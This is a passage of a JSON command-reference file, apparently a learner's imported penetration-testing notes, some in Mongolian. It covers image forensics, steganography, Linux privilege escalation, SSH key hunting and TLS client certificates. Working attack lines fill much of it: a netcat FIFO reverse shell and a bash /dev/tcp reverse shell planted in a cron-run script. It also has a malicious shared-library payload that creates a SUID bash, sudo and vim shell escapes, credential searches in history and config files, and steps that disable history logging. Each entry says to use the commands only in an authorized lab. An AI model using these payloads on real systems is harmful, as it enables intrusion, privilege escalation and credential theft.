        "cmd": ">     ==**Web Shell Limitation: Shells spawned via web exploits (PHP system() / eval()) lack a ==/dev/tty== interface, causing interactive commands (su, sudo, passwd) to fail or hang.**==\n>"
      },
      {
        "label": "Source Ignite - block 2",
        "cmd": ">     Netcat Named Pipe (FIFO) Reverse Shell:\n>"
      },
      {
        "label": "Source Ignite - block 3",
        "cmd": "==rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc [KALI_IP] [PORT] > /tmp/f=="
      },
      {
        "label": "Source Ignite - block 4",
        "cmd": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-12",
    "title": "cheatshit",
    "category": "network",
    "description": "Imported command reference from KS: Image exploit/cheatshit.md",
    "methodology": "Source file: Image exploit/cheatshit.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source cheatshit - block 1",
        "cmd": "PNG  → 89 50 4E 47\nJPEG → FF D8 FF\nGIF  → GIF\nZIP  → PK\nPDF  → %PDF\nELF  → ELF\nEXE  → MZ"
      },
      {
        "label": "Source cheatshit - block 2",
        "cmd": "file image.png"
      },
      {
        "label": "Source cheatshit - block 3",
        "cmd": "xxd -l 32 image.png"
      },
      {
        "label": "Source cheatshit - block 4",
        "cmd": "hexdump -C -n 32 image.png"
      },
      {
        "label": "Source cheatshit - block 5",
        "cmd": "pngcheck image.png"
      },
      {
        "label": "Source cheatshit - block 6",
        "cmd": "binwalk image.png"
      },
      {
        "label": "Source cheatshit - block 7",
        "cmd": "file\n ↓\n❓ WHAT IS IT?\n\nxxd\n ↓\n❓ WHAT ARE THE RAW BYTES?\n\npngcheck\n ↓\n❓ IS THE STRUCTURE VALID?\n\nbinwalk\n ↓\n❓ IS SOMETHING ELSE INSIDE?"
      },
      {
        "label": "Source cheatshit - block 8",
        "cmd": "89 50 4E 47 0D 0A 1A 0A"
      },
      {
        "label": "Source cheatshit - block 9",
        "cmd": "00 00 00 00 00 00 00 00"
      },
      {
        "label": "Source cheatshit - block 10",
        "cmd": "🏷️ Extension\n   ↓\n\"I am PNG!\"\n\n🔬 Magic bytes\n   ↓\n\"Prove it.\"\n\n❌ Wrong signature\n   ↓\nHeader may be corrupted"
      },
      {
        "label": "Source cheatshit - block 11",
        "cmd": "89 50 4E 47 0D 0A 1A 0A"
      },
      {
        "label": "Source cheatshit - block 12",
        "cmd": "with open(\"bad.png\", \"rb\") as f:\n    data = bytearray(f.read())\n\ndata[:8] = bytes([\n    0x89, 0x50, 0x4E, 0x47,\n    0x0D, 0x0A, 0x1A, 0x0A\n])\n\nwith open(\"fixed.png\", \"wb\") as f:\n    f.write(data)"
      },
      {
        "label": "Source cheatshit - block 13",
        "cmd": "REPAIR\n  ↓\nfile\n  ↓\npngcheck\n  ↓\nOPEN"
      },
      {
        "label": "Source cheatshit - block 14",
        "cmd": "📦 FILE\n          │\n          ▼\n   🏷️ Extension\n   \"I say I'm PNG\"\n          │\n          ▼\n   🧬 MAGIC BYTES\n   \"Prove your identity.\"\n          │\n          ▼\n      🔬 XXD\n   \"Show raw bytes.\"\n          │\n          ▼\n    🩺 PNGCHECK\n   \"Is structure valid?\"\n          │\n          ▼\n     📦 BINWALK\n   \"Anything hidden?\""
      },
      {
        "label": "Source cheatshit - block 15",
        "cmd": ">  After fixing the file:\n>   \n>     # 1. Verify the file command recognizes it:"
      },
      {
        "label": "Source cheatshit - block 16",
        "cmd": ">   \n>     # 2. View the image:"
      },
      {
        "label": "Source cheatshit - block 17",
        "cmd": ">     # or"
      },
      {
        "label": "Source cheatshit - block 18",
        "cmd": ">     # or"
      },
      {
        "label": "Source cheatshit - block 19",
        "cmd": ">   \n>"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-13",
    "title": "commands",
    "category": "network",
    "description": "Imported command reference from KS: Image exploit/commands.md",
    "methodology": "Source file: Image exploit/commands.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source commands - block 1",
        "cmd": "exiftool -a -u aa.jpg"
      },
      {
        "label": "Source commands - block 2",
        "cmd": "-a → duplicate tags-ийг бас харуул\n-u → unknown tags-ийг бас харуул"
      },
      {
        "label": "Source commands - block 3",
        "cmd": "exiftool aa.jpg | grep -iE \"comment|artist|description\""
      },
      {
        "label": "Source commands - block 4",
        "cmd": "exiftool\n   ↓\nбүх metadata\n   ↓\ngrep\n   ↓\nзөвхөн:\ncomment\nartist\ndescription"
      },
      {
        "label": "Source commands - block 5",
        "cmd": "Comment\ncomment\nCOMMENT"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-14",
    "title": "commands2",
    "category": "network",
    "description": "Imported command reference from KS: Image exploit/commands2.md",
    "methodology": "Source file: Image exploit/commands2.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source commands2 - block 1",
        "cmd": "steghide info image.jpg"
      },
      {
        "label": "Source commands2 - block 2",
        "cmd": "steghide extract -sf image.jpg"
      },
      {
        "label": "Source commands2 - block 3",
        "cmd": "-sf = stegofile"
      },
      {
        "label": "Source commands2 - block 4",
        "cmd": "steghide extract -sf image.jpg -p \"keyword\""
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-15",
    "title": "linux prev 3",
    "category": "linux",
    "description": "Imported command reference from KS: linux prev fundd/linux prev 3.md",
    "methodology": "Source file: linux prev fundd/linux prev 3.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source linux prev 3 - block 1",
        "cmd": ">     Core Vulnerability: An SUID root binary attempts to load a shared library (.so) from a user-writable directory (due to misconfigured RPATH/RUNPATH) or tries to load a non-existent library.\n>"
      },
      {
        "label": "Source linux prev 3 - block 2",
        "cmd": "strace [SUID_BINARY] 2>&1 | grep -iE \"open|access|no such file\""
      },
      {
        "label": "Source linux prev 3 - block 3",
        "cmd": ">     Payload Construction (lib.c):\n>     code C\n>"
      },
      {
        "label": "Source linux prev 3 - block 4",
        "cmd": "#include <stdio.h>\n#include <stdlib.h>\nstatic void inject() __attribute__((constructor));\nvoid inject() {\n    system(\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p\");\n}\n\nCompilation: ==gcc -shared -fPIC -o /path/to/missing/lib.so lib.c==\n\n>"
      },
      {
        "label": "Source linux prev 3 - block 5",
        "cmd": "==**8. Save the file as libcalc.c==**\n**==9. In command prompt type:==**\n**==gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c==**\n**==10. In command prompt type: /usr/local/bin/suid-so==**\n**==11. In command prompt type: id**=="
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-16",
    "title": "linux prev fund",
    "category": "linux",
    "description": "Imported command reference from KS: linux prev fundd/linux prev fund.md",
    "methodology": "Source file: linux prev fundd/linux prev fund.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source linux prev fund - block 1",
        "cmd": ">     Vulnerability Mechanism: Command history flushes from RAM buffer (HISTSIZE) to disk (~/.bash_history / HISTFILESIZE) upon session termination.\n> \n>     Key Audit Files:\n>"
      },
      {
        "label": "Source linux prev fund - block 2",
        "cmd": "==cat ~/.bash_history==\n\n        ==cat /root/.bash_history== (If readable)\n\n        ==cat /home/*/.bash_history=="
      },
      {
        "label": "Source linux prev fund - block 3",
        "cmd": "grep -iE \"passw|user|admin|ssh|mysql|key|token\" ~/.bash_history"
      },
      {
        "label": "Source linux prev fund - block 4",
        "cmd": ">     Operator Anti-Forensics (Preventing History Logging):\n> \n>         Leading space before command: [command] (Requires HISTCONTROL=ignorespace).\n> \n>         Session-wide suppression: ==unset HISTFILE && export HISTSIZE=0==.\n>"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-17",
    "title": "linux prev",
    "category": "linux",
    "description": "Imported command reference from KS: linux prev fundd/linux prev.md",
    "methodology": "Source file: linux prev fundd/linux prev.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source linux prev - block 1",
        "cmd": "👤 YOU\n  ↓\n💻 Linux Machine"
      },
      {
        "label": "Source linux prev - block 2",
        "cmd": "❓ Ямар machine?\n❓ Би хэн бэ?\n❓ Root байж болох уу?\n❓ Ямар хэрэглэгчид байна?\n❓ Сонирхолтой файл байна уу?\n❓ Ямар service ажиллаж байна?\n❓ Root-оор ажилладаг job байна уу?\n❓ Надад бичих permission байгаа газар байна уу?\n❓ Kernel хуучин уу?"
      },
      {
        "label": "Source linux prev - block 3",
        "cmd": "id\nhostname\nuname -a\ncat /etc/os-release\npwd"
      },
      {
        "label": "Source linux prev - block 4",
        "cmd": "id"
      },
      {
        "label": "Source linux prev - block 5",
        "cmd": "uid=1000(karen) gid=1000(karen) groups=..."
      },
      {
        "label": "Source linux prev - block 6",
        "cmd": "👤 Karen\nUID = 1000"
      },
      {
        "label": "Source linux prev - block 7",
        "cmd": "uid=0(root)"
      },
      {
        "label": "Source linux prev - block 8",
        "cmd": "👑 OMG, би аль хэдийн root!"
      },
      {
        "label": "Source linux prev - block 9",
        "cmd": "hostname"
      },
      {
        "label": "Source linux prev - block 10",
        "cmd": "web-server-01"
      },
      {
        "label": "Source linux prev - block 11",
        "cmd": "👤 Би = Karen\n🏠 Байшин = web-server-01"
      },
      {
        "label": "Source linux prev - block 12",
        "cmd": "uname -a"
      },
      {
        "label": "Source linux prev - block 13",
        "cmd": "Linux web-server 5.x.x ... x86_64 ..."
      },
      {
        "label": "Source linux prev - block 14",
        "cmd": "🐧 Linux\n🧠 Kernel version\n💻 Architecture"
      },
      {
        "label": "Source linux prev - block 15",
        "cmd": "cat /etc/os-release"
      },
      {
        "label": "Source linux prev - block 16",
        "cmd": "Ubuntu\nDebian\nFedora\n..."
      },
      {
        "label": "Source linux prev - block 17",
        "cmd": "uname -a\n   ↓\nKernel\n\n/etc/os-release\n   ↓\nDistribution"
      },
      {
        "label": "Source linux prev - block 18",
        "cmd": "🐧 Linux\n  │\n  ├── Kernel → uname -a\n  │\n  └── Distribution → /etc/os-release"
      },
      {
        "label": "Source linux prev - block 19",
        "cmd": "pwd"
      },
      {
        "label": "Source linux prev - block 20",
        "cmd": "/home/karen"
      },
      {
        "label": "Source linux prev - block 21",
        "cmd": "🏠 Машин\n └── 📂 home\n      └── 📂 karen\n            ↑\n           YOU"
      },
      {
        "label": "Source linux prev - block 22",
        "cmd": "🕵️ YOU ENTERED MACHINE\n                 │\n       ┌─────────┼─────────┐\n       ↓         ↓         ↓\n      WHO       WHERE      WHAT\n       │         │         │\n      id      hostname   uname\n       │                    │\n       │               /etc/os-release\n       │\n       └─────── pwd ────────"
      },
      {
        "label": "Source linux prev - block 23",
        "cmd": "cat /etc/passwd"
      },
      {
        "label": "Source linux prev - block 24",
        "cmd": "root\nalice\nbob\nkaren\n..."
      },
      {
        "label": "Source linux prev - block 25",
        "cmd": "🏢 Company employee list\n\nAlice\nBob\nKaren\nAdmin\nBackup\nServiceAccount\n..."
      },
      {
        "label": "Source linux prev - block 26",
        "cmd": "👤 normal user\n🤖 service account\n👑 root"
      },
      {
        "label": "Source linux prev - block 27",
        "cmd": "cat /etc/group"
      },
      {
        "label": "Source linux prev - block 28",
        "cmd": "docker:x:999:karen\nsudo:x:27:karen"
      },
      {
        "label": "Source linux prev - block 29",
        "cmd": "Karen\n ├── sudo group\n ├── docker group\n └── developers group"
      },
      {
        "label": "Source linux prev - block 30",
        "cmd": "sudo -l"
      },
      {
        "label": "Source linux prev - block 31",
        "cmd": "User karen may run:\n    /usr/bin/some-program"
      },
      {
        "label": "Source linux prev - block 32",
        "cmd": "🔑 My permissions"
      },
      {
        "label": "Source linux prev - block 33",
        "cmd": "find / -perm -4000 -type f 2>/dev/null"
      },
      {
        "label": "Source linux prev - block 34",
        "cmd": "👤 Karen\n ↓\nprogram\n ↓\nKaren эрхээр ажиллана"
      },
      {
        "label": "Source linux prev - block 35",
        "cmd": "👤 Karen\n ↓\n🔑 SUID program\n ↓\n👑 File owner's privilege"
      },
      {
        "label": "Source linux prev - block 36",
        "cmd": "SUID root program"
      },
      {
        "label": "Source linux prev - block 37",
        "cmd": "4000\n ↑\nSUID bit"
      },
      {
        "label": "Source linux prev - block 38",
        "cmd": "find / -perm -2000 -type f 2>/dev/null"
      },
      {
        "label": "Source linux prev - block 39",
        "cmd": "4000 → SUID\n2000 → SGID"
      },
      {
        "label": "Source linux prev - block 40",
        "cmd": "getcap -r / 2>/dev/null"
      },
      {
        "label": "Source linux prev - block 41",
        "cmd": "👑 MASTER KEY"
      },
      {
        "label": "Source linux prev - block 42",
        "cmd": "🔑 \"Only one special power\""
      },
      {
        "label": "Source linux prev - block 43",
        "cmd": "Program\n ├── special network power\n ├── special UID-changing power\n └── ..."
      },
      {
        "label": "Source linux prev - block 44",
        "cmd": "find / -name \"*.conf\" -o -name \"*.config\" 2>/dev/null | head -20"
      },
      {
        "label": "Source linux prev - block 45",
        "cmd": "database.conf\nweb.config\napp.conf"
      },
      {
        "label": "Source linux prev - block 46",
        "cmd": "database = ...\nusername = ...\npassword = ..."
      },
      {
        "label": "Source linux prev - block 47",
        "cmd": "find /var/www -type f -name \"*.php\" 2>/dev/null | xargs grep -i \"password\\|passwd\\|pwd\" 2>/dev/null"
      },
      {
        "label": "Source linux prev - block 48",
        "cmd": "/var/www\n   ↓\nwebsite source\n   ↓\nconfig\n   ↓\ndatabase credentials?"
      },
      {
        "label": "Source linux prev - block 49",
        "cmd": "cat ~/.bash_history"
      },
      {
        "label": "Source linux prev - block 50",
        "cmd": "mysql ...\nssh ...\nexport ...\npassword ..."
      },
      {
        "label": "Source linux prev - block 51",
        "cmd": "cat /home/*/.bash_history 2>/dev/null"
      },
      {
        "label": "Source linux prev - block 52",
        "cmd": "grep -r \"password\" /var/www/ 2>/dev/null"
      },
      {
        "label": "Source linux prev - block 53",
        "cmd": "ps aux"
      },
      {
        "label": "Source linux prev - block 54",
        "cmd": "nginx\napache\nmysql\npython\nbackup\n..."
      },
      {
        "label": "Source linux prev - block 55",
        "cmd": "ps aux | grep root"
      },
      {
        "label": "Source linux prev - block 56",
        "cmd": "root    backup-script\nroot    custom-service"
      },
      {
        "label": "Source linux prev - block 57",
        "cmd": "netstat -tulnp"
      },
      {
        "label": "Source linux prev - block 58",
        "cmd": "ss -tulnp"
      },
      {
        "label": "Source linux prev - block 59",
        "cmd": "22    SSH\n80    HTTP\n3306  MySQL\n..."
      },
      {
        "label": "Source linux prev - block 60",
        "cmd": "🏠 MACHINE\n\n🚪 22\n🚪 80\n🚪 3306\n🚪 8080"
      },
      {
        "label": "Source linux prev - block 61",
        "cmd": "02:00 AM\n   ↓\nbackup.sh"
      },
      {
        "label": "Source linux prev - block 62",
        "cmd": "⏰ Every night\n      ↓\n🤖 Robot wakes up\n      ↓\nruns backup"
      },
      {
        "label": "Source linux prev - block 63",
        "cmd": "cat /etc/crontab"
      },
      {
        "label": "Source linux prev - block 64",
        "cmd": "ls -la /etc/cron.*"
      },
      {
        "label": "Source linux prev - block 65",
        "cmd": "crontab -l"
      },
      {
        "label": "Source linux prev - block 66",
        "cmd": "ls -la /var/spool/cron/"
      },
      {
        "label": "Source linux prev - block 67",
        "cmd": "🤖 What runs automatically?\n        +\n👑 Who runs it?\n        +\n✍️ Can I modify what it runs?"
      },
      {
        "label": "Source linux prev - block 68",
        "cmd": "root\n ↓\n⏰ cron\n ↓\n/some/script.sh"
      },
      {
        "label": "Source linux prev - block 69",
        "cmd": "👤 YOU\n   ↓\n✍️ modify script\n   ↓\n⏰ cron\n   ↓\n👑 root runs script"
      },
      {
        "label": "Source linux prev - block 70",
        "cmd": "find / -writable -type d 2>/dev/null | grep -v proc"
      },
      {
        "label": "Source linux prev - block 71",
        "cmd": "find / -writable -type f 2>/dev/null | grep -v proc"
      },
      {
        "label": "Source linux prev - block 72",
        "cmd": "👀 READ"
      },
      {
        "label": "Source linux prev - block 73",
        "cmd": "✍️ WRITE"
      },
      {
        "label": "Source linux prev - block 74",
        "cmd": "WRITE\n  +\nPRIVILEGED EXECUTION\n  +\nTRUST"
      },
      {
        "label": "Source linux prev - block 75",
        "cmd": "uname -a\ncat /proc/version"
      },
      {
        "label": "Source linux prev - block 76",
        "cmd": "searchsploit ubuntu 16.04"
      },
      {
        "label": "Source linux prev - block 77",
        "cmd": "Version\nArchitecture\nPatch level\nConfiguration\nExploit requirements"
      },
      {
        "label": "Source linux prev - block 78",
        "cmd": "id\nhostname\nuname -a\ncat /etc/os-release\npwd"
      },
      {
        "label": "Source linux prev - block 79",
        "cmd": "🪪 WHO AM I?\n🏠 WHICH MACHINE?\n🧠 WHICH KERNEL?\n🐧 WHICH OS?\n📍 WHERE AM I?"
      },
      {
        "label": "Source linux prev - block 80",
        "cmd": "/etc/passwd\n/etc/group\nsudo -l"
      },
      {
        "label": "Source linux prev - block 81",
        "cmd": "👥 USERS\n👪 GROUPS\n🔑 MY PRIVILEGES"
      },
      {
        "label": "Source linux prev - block 82",
        "cmd": "configs\nhistory\nweb files\ncredentials"
      },
      {
        "label": "Source linux prev - block 83",
        "cmd": "📄 CONFIGS\n🧠 HISTORY\n🔑 SECRETS"
      },
      {
        "label": "Source linux prev - block 84",
        "cmd": "ps aux\nss -tulnp"
      },
      {
        "label": "Source linux prev - block 85",
        "cmd": "⚙️ PROCESSES\n🚪 PORTS"
      },
      {
        "label": "Source linux prev - block 86",
        "cmd": "cron"
      },
      {
        "label": "Source linux prev - block 87",
        "cmd": "⏰ SCHEDULED JOBS"
      },
      {
        "label": "Source linux prev - block 88",
        "cmd": "find writable"
      },
      {
        "label": "Source linux prev - block 89",
        "cmd": "✍️ WRITE ACCESS"
      },
      {
        "label": "Source linux prev - block 90",
        "cmd": "uname\n/proc/version\nsearchsploit"
      },
      {
        "label": "Source linux prev - block 91",
        "cmd": "🧠 KERNEL\n📦 VERSION\n💥 KNOWN VULNS"
      },
      {
        "label": "Source linux prev - block 92",
        "cmd": "👤 WHO AM I?\n   ↓\n🏠 WHERE AM I?\n   ↓\n👑 WHAT CAN I DO?\n   ↓\n🔑 WHAT SECRETS EXIST?\n   ↓\n⚙️ WHAT IS RUNNING?\n   ↓\n🚪 WHAT IS OPEN?\n   ↓\n⏰ WHAT RUNS AUTOMATICALLY?\n   ↓\n✍️ WHAT CAN I MODIFY?\n   ↓\n🧬 IS THE SYSTEM OLD/VULNERABLE?"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-18",
    "title": "SSH",
    "category": "linux",
    "description": "Imported command reference from KS: linux prev fundd/SSH.md",
    "methodology": "Source file: linux prev fundd/SSH.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source SSH - block 1",
        "cmd": "> ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i id_rsa root@10.49.158.131"
      },
      {
        "label": "Source SSH - block 2",
        "cmd": ">     Asymmetric Pair Logic: authorized_keys holds the public padlock; id_rsa holds the private key that bypasses password authentication.\n> \n>     Enumeration Commands (Searching the Filesystem):\n>"
      },
      {
        "label": "Source SSH - block 3",
        "cmd": "Hunt Private Keys:\n>          find / -name id_rsa 2>/dev/null\n\n        Hunt Authorized Keys:\n        find / -name authorized_keys 2>/dev/null\n\n        Hunt Backup Keys:\n        find / -name \"*.key\" -o -name \"*.pem\" 2>/dev/null"
      },
      {
        "label": "Source SSH - block 4",
        "cmd": ">     Mandatory SSH Client Permissions: ==chmod 600 id_rsa== (or 400). OpenSSH strictly rejects private keys with group/world-readable permissions.\n> \n>"
      },
      {
        "label": "Source SSH - block 5",
        "cmd": "Authentication Command: ==ssh -i id_rsa root@[TARGET_IP]=="
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-20",
    "title": "attack",
    "category": "linux",
    "description": "Imported command reference from KS: linux prev/attack.md",
    "methodology": "Source file: linux prev/attack.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source attack - block 1",
        "cmd": ">     ==**HTTP Staging Server (Kali): python3 -m http.server [PORT] (Turns current directory into an immediate HTTP file server).==**\n>"
      },
      {
        "label": "Source attack - block 2",
        "cmd": ">     **==Target Landing Zone (/tmp): World-writable directory with sticky bit permissions (1777), allowing low-privilege users to stage tools without permission errors.**==\n>"
      },
      {
        "label": "Source attack - block 3",
        "cmd": ">         ==gcc -O2 exploit.c -o exploit==\n>"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-22",
    "title": "attack4",
    "category": "linux",
    "description": "Imported command reference from KS: linux prev/attack4.md",
    "methodology": "Source file: linux prev/attack4.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source attack4 - block 1",
        "cmd": ">     Concept: Granular root privilege division stored in file extended attributes (xattr), bypassing SUID permission indicators.\n>"
      },
      {
        "label": "Source attack4 - block 2",
        "cmd": ">     getcap -r / 2>/dev/null"
      },
      {
        "label": "Source attack4 - block 3",
        "cmd": "vim -c 'some command'"
      },
      {
        "label": "Source attack4 - block 4",
        "cmd": "/home/karen/vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-23",
    "title": "attack5",
    "category": "linux",
    "description": "Imported command reference from KS: linux prev/attack5.md",
    "methodology": "Source file: linux prev/attack5.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source attack5 - block 1",
        "cmd": "> REVERSE SHELL\n>"
      },
      {
        "label": "Source attack5 - block 2",
        "cmd": "> echo '#!/bin/bash bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1' > /home/karen/backup.sh"
      },
      {
        "label": "Source attack5 - block 3",
        "cmd": "chmod +x /home/karen/backup.sh"
      },
      {
        "label": "Source attack5 - block 4",
        "cmd": "> python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n>"
      },
      {
        "label": "Source attack5 - block 5",
        "cmd": "> ==a. sudo find /bin -name nano -exec /bin/sh \\;==\n> ==b. sudo awk 'BEGIN {system(\"/bin/sh\")}'==\n> ==c. echo \"==\n> ==.execute('/bin/sh')\" > shell.nse && sudo==\n> ==--script=shell.nse==\n> ==d. sudo vim -c '!sh'==\n>"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-24",
    "title": "attack6",
    "category": "linux",
    "description": "Imported command reference from KS: linux prev/attack6.md",
    "methodology": "Source file: linux prev/attack6.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source attack6 - block 1",
        "cmd": "> Title: Linux PrivEsc - PATH Hijacking (SUID Context)\n>"
      },
      {
        "label": "Source attack6 - block 2",
        "cmd": "echo $PATH"
      },
      {
        "label": "Source attack6 - block 3",
        "cmd": ">         ==**Find Writable Directories:**== \n>"
      },
      {
        "label": "Source attack6 - block 4",
        "cmd": "find / -writable -type d 2>/dev/null"
      },
      {
        "label": "Source attack6 - block 5",
        "cmd": ">         Find SUID Binaries: \n>"
      },
      {
        "label": "Source attack6 - block 6",
        "cmd": "find / -perm -u=s -type f 2>/dev/null"
      },
      {
        "label": "Source attack6 - block 7",
        "cmd": "> \n>         Identify unquoted binary call inside SUID program (via strings [binary]).\n> \n>         Prepend writable directory to PATH: ==export PATH=/tmp:$PATH== (or use existing writable PATH directory).\n> \n>         Create malicious payload with target name in that folder:"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-26",
    "title": "mount",
    "category": "linux",
    "description": "Imported command reference from KS: linux prev/mount.md",
    "methodology": "Source file: linux prev/mount.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source mount - block 1",
        "cmd": "> gcc shell.c -o shell          # Simple compile\n> gcc -Wall shell.c -o shell    # Compile with warnings\n>"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-27",
    "title": "Tools",
    "category": "linux",
    "description": "Imported command reference from KS: linux prev/Tools.md",
    "methodology": "Source file: linux prev/Tools.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source Tools - block 1",
        "cmd": ">         Kernel Release: ==uname -a== or ==cat /proc/version==\n> \n>         OS Distribution: ==cat /etc/issue== or ==cat /etc/os-release==\n>"
      },
      {
        "label": "Source Tools - block 2",
        "cmd": ">         Current ID & Groups: ==id==\n> \n>         Sudo Privileges: ==sudo -l==\n> \n>         System Users: ==cat /etc/passwd | grep -E \"home|sh$\"==\n>"
      },
      {
        "label": "Source Tools - block 3",
        "cmd": ">         Listening Ports: ==netstat -tlpn== or ==ss -tulpn==\n> \n>         Routing Table: ==ip route==\n>"
      },
      {
        "label": "Source Tools - block 4",
        "cmd": ">         SUID Binaries: \n>         \n>         find / -perm -u=s -type f 2>/dev/null\n>         \n>         find / -type f -perm -04000 -ls 2>/dev/null\n>         \n>         find / -type f -name \"*flag*\" 2>/dev/null\n>         \n>         find / -name \"root.txt\" 2>/dev/null\n>         \n> \n>         World-Writable Directories: ==\n>         find -w/ ritable -type d 2>/dev/null==\n>"
      },
      {
        "label": "Source Tools - block 5",
        "cmd": "-rwsr-xr-x 1 root root ... /usr/bin/base64"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-29",
    "title": "cheatshit",
    "category": "network",
    "description": "Imported command reference from KS: NETWORK/gojo's domain/cheatshit.md",
    "methodology": "Source file: NETWORK/gojo's domain/cheatshit.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source cheatshit - block 1",
        "cmd": "👤 CLIENT\n   │\n   │ TLS handshake\n   ▼\n🌐 SERVER\n   │\n   └── 📜 Server Certificate"
      },
      {
        "label": "Source cheatshit - block 2",
        "cmd": "Client ✅ verifies Server\nServer ❌ does not necessarily require Client Cert"
      },
      {
        "label": "Source cheatshit - block 3",
        "cmd": "👤 CLIENT\n   │\n   │ 📜 Client Certificate\n   ▼\n🌐 SERVER\n   │\n   │ 📜 Server Certificate\n   ▼\n🤝 BOTH VERIFY EACH OTHER"
      },
      {
        "label": "Source cheatshit - block 4",
        "cmd": ".crt → \"Би хэн бэ?\"\n.key → \"Би үнэхээр тэр хүн гэдгээ батал.\"\nCA   → \"Энэ identity-д итгэж болно.\""
      },
      {
        "label": "Source cheatshit - block 5",
        "cmd": "nc <TARGET_IP> <PORT>"
      },
      {
        "label": "Source cheatshit - block 6",
        "cmd": "👤 YOU ─────────────► 🌐 SERVER\n        plain TCP"
      },
      {
        "label": "Source cheatshit - block 7",
        "cmd": "openssl s_client -connect <TARGET_IP>:<PORT> -quiet"
      },
      {
        "label": "Source cheatshit - block 8",
        "cmd": "👤 YOU\n  ↓\nopenssl\n  ↓\n🤝 TLS handshake\n  ↓\n🌐 SERVER"
      },
      {
        "label": "Source cheatshit - block 9",
        "cmd": "Plain TCP → nc\nTLS TCP   → openssl s_client"
      },
      {
        "label": "Source cheatshit - block 10",
        "cmd": "curl \\\n  --cert client.crt \\\n  --key client.key \\\n  https://<TARGET_IP>:<PORT>/"
      },
      {
        "label": "Source cheatshit - block 11",
        "cmd": "--cert → 🪪 Client certificate\n--key  → 🔑 Client private key"
      },
      {
        "label": "Source cheatshit - block 12",
        "cmd": "curl -k \\\n  --cert client.crt \\\n  --key client.key \\\n  https://<TARGET_IP>:<PORT>/"
      },
      {
        "label": "Source cheatshit - block 13",
        "cmd": "openssl s_client \\\n  -connect <TARGET_IP>:<PORT> \\\n  -cert client.crt \\\n  -key client.key \\\n  -quiet"
      },
      {
        "label": "Source cheatshit - block 14",
        "cmd": "📜 client.crt\n      +\n🔑 client.key\n      ↓\n🤝 TLS handshake\n      ↓\n✅ Client authenticated\n      ↓\n🔐 Protected service"
      },
      {
        "label": "Source cheatshit - block 15",
